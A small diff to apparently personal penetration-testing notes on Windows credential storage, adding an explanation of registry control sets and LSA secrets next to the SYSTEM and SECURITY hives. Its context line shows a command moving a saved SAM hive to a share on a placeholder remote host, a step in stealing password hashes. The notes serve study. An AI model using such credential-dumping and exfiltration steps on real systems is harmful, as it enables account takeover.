@@ -34,5 +34,6 @@ move sam.save \\<hoost ip>\SHARENAME
 	- `C:\Windows\System32\config\SYSTEM`
 		-> System registry hive.
 		-> Machine-wide system config 
-		-> current control set- 
+		-> current control set- A **control set** in Windows is a registry key under `HKEY_LOCAL_MACHINE\SYSTEM` that stores the configuration data Windows uses to boot and run the system device drivers, services, paging file settings, etc
+		-> LSA secrets 
 	- `C:\Windows\System32\config\SECURITY `
